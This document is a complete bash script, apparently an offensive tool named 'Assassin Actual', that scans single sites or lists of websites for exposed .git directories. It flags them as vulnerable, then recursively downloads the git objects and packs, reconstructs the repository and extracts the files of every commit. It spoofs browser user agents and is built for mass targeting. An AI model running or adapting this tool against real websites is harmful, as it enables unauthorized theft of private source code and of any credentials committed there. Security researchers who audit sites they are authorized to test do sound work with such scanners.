#!/bin/bash
#Colors variabel
NC='\033[0m'
RED='\033[1;38;5;196m'
GREEN='\033[1;38;5;040m'
ORANGE='\033[1;38;5;202m'
BLUE='\033[1;38;5;012m'
BLUE2='\033[1;38;5;032m'
PINK='\033[1;38;5;013m'
GRAY='\033[1;38;5;004m'
NEW='\033[1;38;5;154m'
YELLOW='\033[1;38;5;214m'
CG='\033[1;38;5;087m'
CP='\033[1;38;5;221m'
CPO='\033[1;38;5;205m'
CN='\033[1;38;5;247m'
CNC='\033[1;38;5;051m'

#Env
regex='^(https?)://[-A-Za-z0-9\+&@#/%?=~_|!:,.;]*[-A-Za-z0-9\+&@#/%=~_|]\.[-A-Za-z0-9\+&@#/%?=~_|!:,.;]*[-A-Za-z0-9\+&@#/%=~_|]$'
LINK='https://github.com/HightechSec/'

#Banner and version
Codename='Assassin Actual'
Vers=1.0.2#beta
function banner(){
echo -e "${CP}"" ___  ___ __ _ _ __  _ __   ___ _ __	"
echo -e "${CP}""/ __|/ __/ _' | '_ \| '_ \ / _ \ '__|   "
echo -e "${CP}""\__ \ (_| (_| | | | | | | |  __/ |			"
echo -e "${CP}""|___/\___\__,_|_| |_|_| |_|\___|_|	  " 
echo -e "${BLUE2}A Framework for Scanning and Dumping"
echo -e "       ${BLUE2}Exposed Git Repository"
}
#Main Menu
function Main_Menu(){
clear
banner
	echo ""
    echo -e "${CN}Author   : ${BLUE}Hightech ($LINK)"
	echo -e "${CN}Codename : ${CPO}${Codename}"
	echo -e "${CN}Version  : ${BLUE}${Vers}"
	echo ""
	echo -e "  ${NC}[${CG}"1"${NC}]${CNC} Scanner and Dumper Menu"
	echo -e "  ${NC}[${CG}"2"${NC}]${CNC} Scanner only Menu"
	echo -e "  ${NC}[${CG}"3"${NC}]${CNC} Dump only Menu"
	echo -e "  ${NC}[${CG}"4"${NC}]${CNC} Extractor"
	echo -e "  ${NC}[${CG}"5"${NC}]${CNC} Exit"
	
	echo ""
	echo -ne "${YELLOW}Input your choice: "; tput sgr0
	read GIT
#Menu Function
if test "$GIT" == '1'
then
    ScanDumpMenu
elif test "$GIT" == '2'
then
	ScanMenu
elif test "$GIT" == '3'
then
    DumpMenu
elif test "$GIT" == '4'
then
	extractmenu
 elif test "$GIT" == '5'
then
	exit
 else
    Main_Menu
    fi
}
#Dumper Function
function dumpstart(){
GITDIR=.git
BASEGITDIR="$BASEDIR/$GITDIR/";
QUEUE=();
DUMPED=();

if [ ! -d "$BASEGITDIR" ]; then
    echo -e "${PINK}[*] Destination folder does not exist";
    echo -e "${PINK}[+] Creating $BASEGITDIR";
    mkdir -p "$BASEGITDIR";
fi
function start_download(){
    QUEUE+=('HEAD')
    QUEUE+=('objects/info/packs')
    QUEUE+=('description')
    QUEUE+=('config')
    QUEUE+=('COMMIT_EDITMSG')
    QUEUE+=('index')
    QUEUE+=('packed-refs')
    QUEUE+=('refs/heads/master')
    QUEUE+=('refs/remotes/origin/HEAD')
    QUEUE+=('refs/stash')
    QUEUE+=('logs/HEAD')
    QUEUE+=('logs/refs/heads/master')
    QUEUE+=('logs/refs/remotes/origin/HEAD')
    QUEUE+=('info/refs')
    QUEUE+=('info/exclude')

    while [ ${#QUEUE[*]} -gt 0 ]
    do
        download_item ${QUEUE[@]:0:1}
        QUEUE=( "${QUEUE[@]:1}" )
    done
}
function download_item() {
    local objname=$1
    local url="$SITE/.git/$objname"
    local hashes=()
    local packs=()
    
    if [[ " ${DUMPED[@]} " =~ " ${objname} " ]]; then
        return
    fi
    local target="$BASEGITDIR$objname"

    dir=$(echo "$objname" | grep -oE "^(.*)/")
    if [ $? -ne 1 ]; then
        mkdir -p "$BASEGITDIR/$dir"
    fi

    curl -L -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36" -f -k -s "$url" -o "$target"
    
    DUMPED+=("$objname")
    if [ ! -f "$target" ]; then
        echo -e "${RED}[-] Dumped: $objname"
        return
    fi
    echo -e "${NEW}[+] Dumped: $objname"

    if [[ "$objname" =~ /[a-f0-9]{2}/[a-f0-9]{38} ]]; then 
        cwd=$(pwd)
        cd "$BASEDIR"
        
        hash=$(echo "$objname" | sed -e 's~objects~~g' | sed -e 's~/~~g')
        
        type=$(git cat-file -t "$hash" 2> /dev/null)
        if [ $? -ne 0 ]; then
            cd "$cwd"
            rm "$target"
            return 
        fi
        
        if [[ "$type" != "blob" ]]; then
            hashes+=($(git cat-file -p "$hash" | grep -oE "([a-f0-9]{40})"))
        else
            hashes+=($(git cat-file -p "$hash" | strings -a | grep -oE "([a-f0-9]{40})"))
        fi

        cd "$cwd"
    fi 
    
    hashes+=($(cat "$target" | strings -a | grep -oE "([a-f0-9]{40})"))
    for hash in ${hashes[*]}
    do
        QUEUE+=("objects/${hash:0:2}/${hash:2}")
    done

    packs+=($(cat "$target" | strings -a | grep -oE "(pack\-[a-f0-9]{40})"))
    for pack in ${packs[*]}
    do 
        QUEUE+=("objects/pack/$pack.pack")
        QUEUE+=("objects/pack/$pack.idx")
    done

}
function extractor(){
    cd "$BASEDIR"
    git checkout .
}
start_download && extractor
}
function extract() {
sour="$SOURCE";
targ="$TARGET";

    if [ ! -d "$SOURCE/.git" ]; then
	echo -e "${RED}[-] There's no .git folder";
	exit 1;
fi

if [ ! -d "$TARGET" ]; then
	echo -e "${NEW}Destination folder does not exist";
    echo -e "${NEW}Creating..."
    mkdir "$TARGET";
fi

function traverse_tree() {
	local tree=$1
	local path=$2
	
    #Read blobs/tree information from root tree
	git ls-tree "$tree" |
	while read leaf; do
		type=$(echo "$leaf" | awk -F' ' '{print $2}') #grep -oP "^\d+\s+\K\w{4}");
		hash=$(echo "$leaf" | awk -F' ' '{print $3}') #grep -oP "^\d+\s+\w{4}\s+\K\w{40}");
		name=$(echo "$leaf" | awk '{$1=$2=$3=""; print substr($0,4)}') #grep -oP "^\d+\s+\w{4}\s+\w{40}\s+\K.*");
		
        # Get the blob data
		git cat-file -e "$hash";
		#Ignore invalid git objects (e.g. ones that are missing)
		if [ $? -ne 0 ]; then
			continue;
		fi	
		
		if [ "$type" = "blob" ]; then
			echo -e "${NEW}[+] Found file: $path/$name"
			git cat-file -p "$hash" > "$path/$name"
		else
			echo -e "${NEW}[+] Found folder: $path/$name"
			mkdir -p "$path/$name";
			#Recursively traverse sub trees
			traverse_tree "$hash" "$path/$name";
		fi
		
	done;
}

function traverse_commit() {
	local base=$1
	local commit=$2
	local count=$3
	
    #Create folder for commit data
	echo -e "${NEW}[+] Found commit: $commit";
	path="$base/$count-$commit"
	mkdir -p "$path";
    #Add meta information
	git cat-file -p "$commit" > "$path/commit-meta.txt"
    #Try to extract contents of root tree
	traverse_tree "$commit" "$path"
}

#Current directory as we'll switch into others and need to restore it.
OLDDIR=$(pwd)
TARGETDIR=$TARGET
COMMITCOUNT=0;

#If we don't have an absolute path, add the prepend the CWD
if [ "${TARGETDIR:0:1}" != "/" ]; then
	TARGETDIR="$OLDDIR/$TARGET"
fi

cd "$SOURCE"

#Extract all object hashes
find ".git/objects" -type f | 
	sed -e "s/\///g" |
	sed -e "s/\.gitobjects//g" |
	while read object; do
	
	type=$(git cat-file -t "$object")
	
    # Only analyse commit objects
	if [ "$type" = "commit" ]; then
		CURDIR=$(pwd)
		traverse_commit "$TARGETDIR" "$object" $COMMITCOUNT
		cd "$CURDIR"
		
		COMMITCOUNT=$((COMMITCOUNT+1))
	fi
	
	done;

cd "$OLDDIR";
}
#Menu Scan&Dump
function ScanDumpMenu(){
    clear
    banner
	echo ""
	echo -e " ${CNC}Scan & Dump Menu"

	echo -e "  ${NC}[${CG}"1"${NC}]${CNC} Scanner and Dumper for Mass Target"
	echo -e "  ${NC}[${CG}"2"${NC}]${CNC} Scanner and Dumper Single Target"
	echo -e "  ${NC}[${CG}"3"${NC}]${CNC} Back to Main menu"
    echo -e "  ${NC}[${CG}"4"${NC}]${CNC} Exit"

	echo ""
	echo -ne "${YELLOW}Input your choice: "; tput sgr0
	read scandump
#Menu Function
if test "$scandump" == '1'
then
    mass_sdump
elif test "$scandump" == '2'
then
	single_sdump
 elif test "$scandump" == '3'
then
	Main_Menu
 elif test "$scandump" == '4'
then
	exit
    else
    ScanDumpMenu
    fi
}
function mass_sdump(){
	echo -ne "${YELLOW}Input your file (ex: /path/to/file.txt): "; tput sgr0
	read LISTS
		if [[ -f ${LISTS} ]]; then
	            echo -e "${GREEN}SUCCESS: File Loaded!"
            else :
                echo -e "${RED}ERROR: File not found!"
                mass_sdump
                return 1
        fi
clear        
for SITE in $(cat "$LISTS");
do
	echo ""
	echo -e "${PINK}Scan & Dump process started..."
	echo -e "${PINK}Target: ${GRAY}${SITE}..."
        if [[ ${SITE} =~ $regex ]]; then
            :
            else :
                echo -e "${RED}ERROR: Not a Valid URL"
                continue
        fi
		if [[ $(curl -s -m 3 -A "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0" "${SITE}/.git/" ) =~ 'Index of /.git' ]]; then
			    echo -e "${GREEN}[+] VULN:${BLUE} ${SITE}"
                echo -ne "${YELLOW}Input your destination folder: "; tput sgr0
			    read BASEDIR
                dumpstart
		elif [[ $(curl -s -m 3 -A "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0" "${SITE}/.git/" -w %{http_code} -o /dev/null ) =~ '403' ]]; then
				echo -e "${ORANGE}[+] MAYBE VULN:${BLUE} ${SITE}"
		    else :
				echo -e "${RED}[+] NOT VULN:${BLUE} ${SITE}"
		fi
done
}
function single_sdump(){
	echo ""	
	echo -ne "${YELLOW}Input your target (ex: http://example.com): "; tput sgr0
	read SITE
		if [[ ${SITE} =~ $regex ]]; then
            :
            else :
                echo -e "${RED}ERROR: ${SITE} is not a Valid URL"
	            single_sdump
                return 1
	    fi
clear			
    echo ""
    echo -e "${PINK}Scan & Dump process started..."
	echo -e "${PINK}Target: ${GRAY}${SITE}..."
		if [[ $(curl -s -m 3 -A "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0" "${SITE}/.git/" ) =~ 'Index of /.git' ]]; then
			    echo -e "${GREEN}[+] VULN:${BLUE} ${SITE}"
                echo -ne "${YELLOW}Input your destination folder: "; tput sgr0
			    read BASEDIR
                dumpstart
		elif [[ $(curl -s -m 3 -A "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0" "${SITE}/.git/" -w %{http_code} -o /dev/null ) =~ '403' ]]; then
			    echo -e "${ORANGE}[+] MAYBE VULN:${BLUE} ${SITE}"
		    else :
			    echo -e "${RED}[+] NOT VULN:${BLUE} ${SITE}"
        fi                   
}
#Menu Scan
function ScanMenu(){
    clear
    banner
	echo ""
	echo -e " ${CNC}Scanner Menu"
	echo -e "  ${NC}[${CG}"1"${NC}]${CNC} Scanner for Mass Target"
	echo -e "  ${NC}[${CG}"2"${NC}]${CNC} Scanner for Single Target"
	echo -e "  ${NC}[${CG}"3"${NC}]${CNC} Back to Main menu"
    echo -e "  ${NC}[${CG}"4"${NC}]${CNC} Exit"

	echo ""
	echo -ne "${YELLOW}Input your choice: "; tput sgr0
	read scan
#Menu Function
if test "$scan" == '1'
then
    mass_scan
elif test "$scan" == '2'
then
	single_scan
 elif test "$scan" == '3'
then
	Main_Menu
 elif test "$scan" == '4'
then
	exit
    else
    ScanMenu
    fi
}
function mass_scan(){
	echo -ne "${YELLOW}Input your file (ex: /path/to/file.txt): "; tput sgr0
	read LISTS
		    if [[ -f ${LISTS} ]]; then
	            echo -e "${GREEN}SUCCESS: File Loaded!"
                    else :
                        echo -e "${RED}ERROR: ${LISTS} not found!"
                        mass_scan
                        return 1
            fi
clear
for SITE in $(cat "$LISTS");
do
    echo ""
	echo -e "${PINK}Scanning process started..."
	echo -e "${PINK}Target: ${GRAY}${SITE}..."
            if [[ ${SITE} =~ $regex ]]; then
                :
                else :
                    echo -e "${RED}ERROR: Not a Valid URL"
                    continue
            fi
	        if [[ $(curl -s -m 3 -A "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0" "${SITE}/.git/" ) =~ 'Index of /.git' ]]; then
	        	    echo -e "${GREEN}[+] VULN:${BLUE} ${SITE}"
	        elif [[ $(curl -s -m 3 -A "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0" "${SITE}/.git/" -w %{http_code} -o /dev/null ) =~ '403' ]]; then
	        		echo -e "${ORANGE}[+] MAYBE VULN:${BLUE} ${SITE}"
	            else :
	        		echo -e "${RED}[+] NOT VULN:${BLUE} ${SITE}"
            fi
    done
}
function single_scan(){
	echo ""	
	echo -ne "${YELLOW}Input your target (ex: http://example.com): "; tput sgr0
	read SITE
	        if [[ ${SITE} =~ $regex ]]; then
	            :
                else :
                    echo -e "${RED}ERROR: ${SITE} is not a Valid URL"
	                single_scan
                    return 1
	        fi		 
    clear  
	echo ""
	echo -e "${PINK}Scanning process started..."
	echo -e "${PINK}Target: ${GRAY}${SITE}..."
	        if [[ $(curl -s -m 3 -A "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0" "${SITE}/.git/" ) =~ 'Index of /.git' ]]; then
	            	echo -e "${GREEN}[+] VULN:${BLUE} ${SITE}"
	        elif [[ $(curl -s -m 3 -A "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0" "${SITE}/.git/" -w %{http_code} -o /dev/null ) =~ '403' ]]; then
	        	    echo -e "${ORANGE}[+] MAYBE VULN:${BLUE} ${SITE}"
	            else :
	        	    echo -e "${RED}[+] NOT VULN:${BLUE} ${SITE}"
	        fi
}	
#Menu dump
function DumpMenu(){
    clear
    banner
	echo ""
	echo -e " ${CNC}Dumper Menu"
	echo -e "  ${NC}[${CG}"1"${NC}]${CNC} Dumper for Mass Target"
	echo -e "  ${NC}[${CG}"2"${NC}]${CNC} Dumper for Single Target"
	echo -e "  ${NC}[${CG}"3"${NC}]${CNC} Back to Main menu"
    echo -e "  ${NC}[${CG}"4"${NC}]${CNC} Exit"

	echo ""
	echo -ne "${YELLOW}Input your choice: "; tput sgr0
	read dump
#Menu Function
if test "$dump" == '1'
then
    mass_dump
elif test "$dump" == '2'
then
	single_dump
 elif test "$dump" == '3'
then
	Main_Menu
 elif test "$dump" == '4'
then
	exit
    else
    DumpMenu
    fi
}
function mass_dump(){
	echo -ne "${YELLOW}Input your file (ex: /path/to/file.txt): "; tput sgr0
	read LISTS
			if [[ -f ${LISTS} ]]; then
	            echo -e "${GREEN}SUCCESS: File Loaded!"
                    else :
                        echo -e "${RED}ERROR: File not found!"
                        mass_dump
                        return 1
            fi
clear
for SITE in $(cat "$LISTS");
do
	echo ""
	echo -e "${PINK}Dumping process started..."
	echo -e "${PINK}Target: ${GRAY}${SITE}..."
            if [[ ${SITE} =~ $regex ]]; then
                :
                    else :
                        echo -e "${RED}ERROR: Not a Valid URL"
                        continue
            fi
    echo -ne "${YELLOW}Input your destination folder: "; tput sgr0
	read BASEDIR
    dumpstart
done
}

function single_dump(){
	echo ""
	echo -ne "${YELLOW}Input your target (ex: http://example.com): "; tput sgr0
	read SITE
			if [[ ${SITE} =~ $regex ]]; then
	            :
                    else :
                        echo -e "${RED}ERROR: ${SITE} is not a Valid URL"
	                    single_dump
                        return 1
	        fi
clear		
    echo ""
    echo -e "${PINK}Scanning process started..."
	echo -e "${PINK}Target: ${GRAY}${SITE}..."	
    echo -ne "${YELLOW}Input your destination folder: "; tput sgr0
    read BASEDIR
    dumpstart
}
function extractmenu(){
                echo -ne "${YELLOW}Input your git folder: "; tput sgr0
			    read SOURCE
                echo -ne "${YELLOW}Input your extracted folder: "; tput sgr0
			    read TARGET
                extract
}
Main_Menu
